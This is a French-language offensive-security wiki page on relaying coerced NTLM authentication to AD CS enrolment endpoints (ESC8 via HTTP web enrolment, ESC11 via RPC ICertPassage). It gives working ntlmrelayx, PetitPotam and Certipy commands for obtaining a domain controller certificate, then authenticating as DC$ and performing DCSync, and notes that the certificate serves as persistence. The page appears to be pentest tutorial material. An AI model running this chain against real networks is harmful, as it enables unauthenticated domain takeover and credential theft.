---
title: "Relais vers AD CS : ESC8 et ESC11"
description: "Relayer une authentification NTLM coercée vers les points de terminaison d'inscription AD CS : l'interface d'inscription web HTTP (ESC8) et l'interface RPC ICertPassage (ESC11), afin d'obtenir un certificat pour le compte machine ou utilisateur relayé."
keywords:
  - ESC8
  - ESC11
  - NTLM relay
  - web enrollment
  - ICertPassage
---

# Relais vers AD CS

Les points de terminaison d'inscription de la CA acceptent l'**authentification NTLM**, et par défaut n'appliquent pas les protections qui bloquent le relais. Ainsi, une authentification [coercée](../ntlm/coercion.md) ou capturée peut être [relayée](../ntlm/relay.md) vers la CA pour obtenir un certificat **en tant que la victime**, le plus puissamment en tant que compte machine d'un contrôleur de domaine, qui sert ensuite à s'authentifier et à effectuer un DCSync.

## ESC8 : inscription web HTTP

L'interface d'**inscription web** d'AD CS (`http://<ca>/certsrv`) et le Certificate Enrollment Service acceptent NTLM et, à moins que l'Extended Protection for Authentication (EPA) ne soit appliquée, constituent des cibles de relais :

```bash
# Relay coerced authentication to web enrolment, requesting a DC-auth certificate
ntlmrelayx.py -t http://<ca>/certsrv/certfnsh.asp -smb2support --adcs --template DomainController
# In another terminal, coerce the DC to authenticate to the relay
petitpotam.py <relay-ip> <dc-ip>
# -> a certificate for DC$; authenticate and DCSync
certipy auth -pfx dc.pfx -dc-ip <dc>
```

Coercez via **HTTP** (grâce au service WebClient) lorsque c'est possible, car l'authentification HTTP n'est pas couverte par la signature SMB et se relaie proprement.

## ESC11 : RPC ICertPassage

ESC11 est la même idée via l'interface d'inscription **RPC** de la CA (ICertPassage / MS-ICPR). Lorsque la CA n'exige pas la confidentialité des paquets sur cette interface (`IF_ENFORCEENCRYPTICERTREQUEST` non défini), une authentification relayée peut demander un certificat via RPC plutôt qu'HTTP :

```bash
# Relay to the CA RPC enrolment endpoint
ntlmrelayx.py -t rpc://<ca> -rpc-mode ICPR -icpr-ca-name <ca-name> --adcs --template Machine
```

Cela compte lorsque le point de terminaison d'inscription web est absent ou protégé par EPA mais que l'interface RPC reste non protégée.

## Notes d'exploitation

- La chaîne canonique du non-authentifié au domaine est **coercer un DC via HTTP -> relayer vers ESC8 -> certificat de DC -> s'authentifier en tant que DC$ -> DCSync** ; elle ne nécessite aucun identifiant si la coercition est accessible sans authentification.
- Demandez un certificat avec le modèle **DomainController** (ou Machine) lors du relais d'un compte machine, et un modèle utilisateur lors du relais d'un utilisateur.
- Un certificat obtenu ainsi est de longue durée et survit à une réinitialisation du mot de passe de la victime, il sert donc aussi de persistance.
- Ce sont des spécialisations AD CS du [relais NTLM](../ntlm/relay.md) général ; les mêmes règles de signature/EPA déterminent la faisabilité.

## Outils

- **ntlmrelayx.py** (`--adcs`, `-rpc-mode ICPR`) : relayer vers l'inscription web et RPC.
- **Coercer / PetitPotam / printerbug.py** : fournir l'authentification.
- **Certipy** (`auth`, `relay`) : demander via relais et s'authentifier avec le résultat.

## Références

- [SpecterOps: Certified Pre-Owned (ESC8)](https://specterops.io/blog/2021/06/17/certified-pre-owned/)
- [SpecterOps: the renaissance of NTLM relay attacks](https://posts.specterops.io/the-renaissance-of-ntlm-relay-attacks-everything-you-need-to-know-abfc3677c34e)
- [Impacket ntlmrelayx](https://github.com/fortra/impacket)
